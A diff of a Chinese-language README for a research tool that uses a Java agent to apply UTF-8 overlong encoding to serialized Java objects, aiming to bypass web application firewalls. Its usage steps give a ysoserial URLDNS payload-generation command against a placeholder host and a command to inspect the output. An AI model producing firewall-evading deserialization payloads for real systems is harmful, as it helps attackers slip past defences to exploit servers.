@@ -1,14 +1,6 @@
 # UTF8 Overlong WAF Bypass Hook
 本项目是对 先知 上发布的 [UTF-8 Overlong Encoding](https://xz.aliyun.com/t/14300) 绕过 WAF (Web Application Firewall) 技术的研究的实现。通过 Java 反序列化利用 Java Agent 技术来实现 UTF-8 Overlong Encoding，从而可能绕过某些 WAF 的防护。
 
-# 使用方法
-
-## 编译
->>> mvn clean package -Dmaven.test.skip=true    
-
-## 使用 ................x
-
-
 
 ## 使用方法
 ### 编译
@@ -17,13 +9,15 @@ mvn clean package -Dmaven.test.skip=true
 ```
 这将编译项目并生成必要的 JAR 文件，同时跳过测试。
 ### 使用
+
 1. 使用 Java Agent 生成 payload：
 ```sh
 java -jar -javaagent:/path/to/UTF8_Agent-1.0-SNAPSHOT.jar ysoserial-0.0.6-SNAPSHOT-all_frohoff.jar URLDNS http://4.example.com > utf8_obf_urldns.bin
 ```
+
 请确保将 `/path/to/UTF8_Agent-1.0-SNAPSHOT.jar` 替换为实际的 Java Agent 文件路径。
 
-2.查看生成的 payload：
+2. 查看生成的 payload：
 ```sh
 xxd -c 42 ./utf8_obf_urldns.bin
 
